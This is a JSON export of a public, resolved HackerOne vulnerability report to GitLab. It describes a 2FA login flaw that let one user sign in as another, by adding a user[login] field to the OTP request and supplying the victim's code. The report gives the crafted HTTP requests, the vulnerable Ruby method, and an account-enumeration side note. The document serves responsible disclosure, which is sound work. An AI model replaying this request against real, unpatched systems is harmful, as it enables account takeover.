{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-04-14T20:27:32.135Z", 
    "voters": [
        "michiel", 
        "eveeez", 
        "pavanw3b", 
        "infosechelper", 
        "silv3rpoision", 
        "spetr0x", 
        "dyabla", 
        "cryptosector", 
        "caffeinewriter"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 128085, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-04-18T06:59:28.439Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Bypassing password authentication of users that have 2FA enabled", 
    "is_member_of_team?": null, 
    "vote_count": 9, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 1677, 
            "content": "This vulnerability allowed password authentication to be bypassed when two-factor authentication was enabled for a user. @GitLab resolved this 2 days after I reported it to them. The commit that fixed the bug can be found at https://gitlab.com/gitlab-org/gitlab-ce/commit/00da609cfd8bf1105fe433dfc92ab263d6205eaf. The bug has been fixed in GitLab version 8.6.5.", 
            "content_html": "<p>This vulnerability allowed password authentication to be bypassed when two-factor authentication was enabled for a user. <a href=\"/gitlab\">@GitLab</a> resolved this 2 days after I reported it to them. The commit that fixed the bug can be found at <a title=\"https://gitlab.com/gitlab-org/gitlab-ce/commit/00da609cfd8bf1105fe433dfc92ab263d6205eaf\" href=\"/redirect?signature=dbe07adef6a1bd7df2e8306a5fd3f9b5816f5491&amp;url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fcommit%2F00da609cfd8bf1105fe433dfc92ab263d6205eaf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gitlab.com/gitlab-org/gitlab-ce/commit/00da609cfd8bf1105fe433dfc92ab263d6205eaf</span><i class=\"icon-external-link\"></i></a>. The bug has been fixed in GitLab version 8.6.5.</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-05-14T20:27:32.220Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "2fa-password-bypass.diff", 
            "type": "text/x-diff", 
            "id": 83019, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/083/019/95fc79353e8b6294611e55df7cbb7901e61f8f61/2fa-password-bypass.diff?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=36b02ce622690bf5d2952e0926d35f28bd7543091db4f4cceb2512eb65113d74"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-04T03:21:04.318Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-04T03:21:04.318Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "As a side-note: this also leaks if someone has 2FA enabled. If the request is sent with a `username` or `email` from someone that doesn't have 2FA enabled, the server responds with the error \"Invalid username/password\". In case the user has 2FA enabled, it responds with \"Invalid two-factor code\". To proof this, @douwem has 2FA enabled (good job!) on gitlab.com and @sytse hasn't (you should enable it ;).", 
            "markdown_message": "<p>As a side-note: this also leaks if someone has 2FA enabled. If the request is sent with a <code>username</code> or <code>email</code> from someone that doesn&#39;t have 2FA enabled, the server responds with the error &quot;Invalid username/password&quot;. In case the user has 2FA enabled, it responds with &quot;Invalid two-factor code&quot;. To proof this, <a href=\"/douwem\">@douwem</a> has 2FA enabled (good job!) on gitlab.com and <a href=\"/sytse\">@sytse</a> hasn&#39;t (you should enable it ;).</p>\n", 
            "type": "Activities::Comment", 
            "id": 886683, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-04T17:35:30.022Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-04T17:35:30.022Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Hi Jobert,\n\nThank you for reporting. We have published this report internally and will be looking into it with our security team. I'll keep you up to date with our progress but feel free to get in touch with us at security@gitlab.com for additional followup or to request further attention to a report. We have also received your other reports and will proceed accordingly.\n\nAdditionally I'de like to point out that I appreciate the quality of the reports especially this one. I'll be in touch as soon as possible. \n\nBest regards,\n\nJos\u00e9 Torres\nGitLab Inc.", 
            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>Thank you for reporting. We have published this report internally and will be looking into it with our security team. I&#39;ll keep you up to date with our progress but feel free to get in touch with us at <a title=\"security@gitlab.com\" href=\"mailto:security@gitlab.com\" rel=\"nofollow noopener noreferrer\">security@gitlab.com</a> for additional followup or to request further attention to a report. We have also received your other reports and will proceed accordingly.</p>\n\n<p>Additionally I&#39;de like to point out that I appreciate the quality of the reports especially this one. I&#39;ll be in touch as soon as possible. </p>\n\n<p>Best regards,</p>\n\n<p>Jos\u00e9 Torres<br>\nGitLab Inc.</p>\n", 
            "type": "Activities::Comment", 
            "id": 887950, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-04T17:35:47.126Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-04T17:35:47.126Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 887951, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-06T05:35:27.086Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-06T05:35:27.086Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Hi Jobert,\n\nGreat report, thank you. Just letting you know that this has been confirmed and scheduled to be released in a patch on the current version.  I'll report back with further updates. Feel free to get in touch with us through security@gitlab.com. \n\nBest regards,\n\nJos\u00e9 Torres\nGitLab B.V.", 
            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>Great report, thank you. Just letting you know that this has been confirmed and scheduled to be released in a patch on the current version.  I&#39;ll report back with further updates. Feel free to get in touch with us through <a title=\"security@gitlab.com\" href=\"mailto:security@gitlab.com\" rel=\"nofollow noopener noreferrer\">security@gitlab.com</a>. </p>\n\n<p>Best regards,</p>\n\n<p>Jos\u00e9 Torres<br>\nGitLab B.V.</p>\n", 
            "type": "Activities::Comment", 
            "id": 891184, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jobert", 
                "url": "/jobert"
            }, 
            "created_at": "2016-04-14T20:26:03.190Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-14T20:26:03.190Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Thank you Jobert for reporting. \n\nWe look forward to further reports. Feel free to get in touch with us through security@gitlab.com or open a new report here.\n\nBest,\n\nJos\u00e9 Torres\nGitLab B.V.", 
            "markdown_message": "<p>Thank you Jobert for reporting. </p>\n\n<p>We look forward to further reports. Feel free to get in touch with us through <a title=\"security@gitlab.com\" href=\"mailto:security@gitlab.com\" rel=\"nofollow noopener noreferrer\">security@gitlab.com</a> or open a new report here.</p>\n\n<p>Best,</p>\n\n<p>Jos\u00e9 Torres<br>\nGitLab B.V.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 906688, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-14T20:27:32.156Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-14T20:27:32.156Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "first_to_agree": true, 
            "message": "Thanks for the quick turnaround @jose, I'll definitely keep looking for more!", 
            "markdown_message": "<p>Thanks for the quick turnaround <a href=\"/jose\">@jose</a>, I&#39;ll definitely keep looking for more!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 906690, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-18T06:59:28.470Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-18T06:59:28.470Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 911063, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-18T06:59:28.532Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-18T06:59:28.532Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 911064, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jobert", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jobert", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/002/15c798072d48f06507cde4b11352a3338ae973fc_small.png?1410255083"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 27, 
        "name": "Improper Authentication - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -80879271.45140202, 
    "disclosed_at": "2016-04-18T06:59:28.512Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/128085", 
    "created_at": "2016-04-04T01:43:51.988Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>When a user has 2FA enabled, it&#39;s possible to sign in as that user without the need to know its password. To reproduce this attack, you need two users that both have 2FA enabled. For the sake of this PoC, lets call them Jane and John. Jane is the attacker and wants to get access to John&#39;s account. John his username is <code>john</code>. Jane knows John&#39;s username. Here&#39;s how you can reproduce it:</p>\n\n<ul>\n<li>as Jane, go to the sign in page and enter your username and password</li>\n<li>in the background, it sets Jane&#39;s user ID in <code>session[:otp_user_id]</code>\n</li>\n<li>you now need to enter Jane&#39;s 2FA code in order to get access to the account</li>\n<li>now intercept all your network traffic with a tool like Burp Suite and capture the request that is send when you submit the 2FA token - it looks like this:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>&gt; POST /users/sign_in HTTP/1.1\n&gt; Host: 159.xxx.xxx.xxx\n&gt; ...\n\n&gt; ----------1881604860\n&gt; Content-Disposition: form-data; name=&quot;user[otp_attempt]&quot;\n&gt; \n&gt; 212421\n&gt; ----------1881604860--\n</code></pre>\n<ul>\n<li>now add the <code>login</code> header to the request - the request now looks like:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>&gt; POST /users/sign_in HTTP/1.1\n&gt; Host: 159.xxx.xxx.xxx\n&gt; ...\n\n&gt; ----------1881604860\n&gt; Content-Disposition: form-data; name=&quot;user[otp_attempt]&quot;\n&gt; \n&gt; 212421\n&gt; ----------1881604860\n&gt; Content-Disposition: form-data; name=&quot;user[login]&quot;\n&gt; \n&gt; john\n&gt; ----------1881604860--\n</code></pre>\n<ul>\n<li>now, instead of <code>212421</code>, send a valid OTP code for <code>john</code> to the server</li>\n<li>Jane is now signed in as John by entering her own password and John&#39;s OTP code - Jane still doesn&#39;t know John&#39;s password</li>\n</ul>\n\n<h1 id=\"impact\">Impact</h1>\n\n<p>The OTP codes are 6 numbers that change every 30 seconds. I haven&#39;t looked whether the server allows time drift. This would increase the chance that an attacker guesses the right OTP code for the account. As a PoC, I could run a small attack against GitLab.com, but I haven&#39;t been able to reach <a href=\"/sytsem\">@sytsem</a> to ask for permission. ;)</p>\n\n<h1 id=\"origin-of-the-issue\">Origin of the issue</h1>\n\n<p>This issue originates from the <code>find_user</code> method in the <code>SessionsController</code>. It returns a <code>User</code> object in two different ways: the first returns the object based on <code>params[:login]</code> parameter. The second one if <code>sessions[:otp_user_id]</code>. The <code>params[:login]</code> parameter takes precedence over the ID stored in the session. This means that if the <code>params[:login]</code> is specified in the request when the 2FA code needs to be verified, a different user can be selected to verify the code against. Here&#39;s the method:</p>\n<pre class=\"highlight ruby\"><code><span class=\"c1\"># app/controllers/sessions_controller.rb:58</span>\n<span class=\"k\">def</span> <span class=\"nf\">find_user</span>\n  <span class=\"k\">if</span> <span class=\"n\">user_params</span><span class=\"p\">[</span><span class=\"ss\">:login</span><span class=\"p\">]</span>\n    <span class=\"no\">User</span><span class=\"p\">.</span><span class=\"nf\">by_login</span><span class=\"p\">(</span><span class=\"n\">user_params</span><span class=\"p\">[</span><span class=\"ss\">:login</span><span class=\"p\">])</span>\n  <span class=\"k\">elsif</span> <span class=\"n\">user_params</span><span class=\"p\">[</span><span class=\"ss\">:otp_attempt</span><span class=\"p\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">session</span><span class=\"p\">[</span><span class=\"ss\">:otp_user_id</span><span class=\"p\">]</span>\n    <span class=\"no\">User</span><span class=\"p\">.</span><span class=\"nf\">find</span><span class=\"p\">(</span><span class=\"n\">session</span><span class=\"p\">[</span><span class=\"ss\">:otp_user_id</span><span class=\"p\">])</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n</code></pre>\n<h1 id=\"fix\">Fix</h1>\n\n<p>Here&#39;s a fix (needs specs to proof that it works): <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"2fa-password-bypass.diff\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/083/019/95fc79353e8b6294611e55df7cbb7901e61f8f61/2fa-password-bypass.diff?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T225523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=36b02ce622690bf5d2952e0926d35f28bd7543091db4f4cceb2512eb65113d74\" data-attachment-type=\"text/x-diff\">2fa-password-bypass.diff (F83019)</a>.</p>\n", 
    "vulnerability_information": "# Proof of Concept\nWhen a user has 2FA enabled, it's possible to sign in as that user without the need to know its password. To reproduce this attack, you need two users that both have 2FA enabled. For the sake of this PoC, lets call them Jane and John. Jane is the attacker and wants to get access to John's account. John his username is `john`. Jane knows John's username. Here's how you can reproduce it:\n\n - as Jane, go to the sign in page and enter your username and password\n - in the background, it sets Jane's user ID in `session[:otp_user_id]`\n - you now need to enter Jane's 2FA code in order to get access to the account\n - now intercept all your network traffic with a tool like Burp Suite and capture the request that is send when you submit the 2FA token - it looks like this:\n\n```\n> POST /users/sign_in HTTP/1.1\n> Host: 159.xxx.xxx.xxx\n> ...\n\n> ----------1881604860\n> Content-Disposition: form-data; name=\"user[otp_attempt]\"\n> \n> 212421\n> ----------1881604860--\n```\n\n - now add the `login` header to the request - the request now looks like:\n\n```\n> POST /users/sign_in HTTP/1.1\n> Host: 159.xxx.xxx.xxx\n> ...\n\n> ----------1881604860\n> Content-Disposition: form-data; name=\"user[otp_attempt]\"\n> \n> 212421\n> ----------1881604860\n> Content-Disposition: form-data; name=\"user[login]\"\n> \n> john\n> ----------1881604860--\n```\n\n - now, instead of `212421`, send a valid OTP code for `john` to the server\n - Jane is now signed in as John by entering her own password and John's OTP code - Jane still doesn't know John's password\n\n# Impact\nThe OTP codes are 6 numbers that change every 30 seconds. I haven't looked whether the server allows time drift. This would increase the chance that an attacker guesses the right OTP code for the account. As a PoC, I could run a small attack against GitLab.com, but I haven't been able to reach @sytsem to ask for permission. ;)\n\n# Origin of the issue \nThis issue originates from the `find_user` method in the `SessionsController`. It returns a `User` object in two different ways: the first returns the object based on `params[:login]` parameter. The second one if `sessions[:otp_user_id]`. The `params[:login]` parameter takes precedence over the ID stored in the session. This means that if the `params[:login]` is specified in the request when the 2FA code needs to be verified, a different user can be selected to verify the code against. Here's the method:\n\n```ruby\n# app/controllers/sessions_controller.rb:58\ndef find_user\n  if user_params[:login]\n    User.by_login(user_params[:login])\n  elsif user_params[:otp_attempt] && session[:otp_user_id]\n    User.find(session[:otp_user_id])\n  end\nend\n```\n\n# Fix\nHere's a fix (needs specs to proof that it works): F83019.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://about.gitlab.com", 
            "about": "Open source software to collaborate on code", 
            "twitter_handle": "gitlab", 
            "name": "GitLab"
        }, 
        "handle": "gitlab", 
        "url": "https://hackerone.com/gitlab", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/264/338ec4b43393873324e3f1911f2f107d025d13f1_small.png?1454722206", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 264, 
        "default_currency": "usd"
    }, 
    "is_published": false
}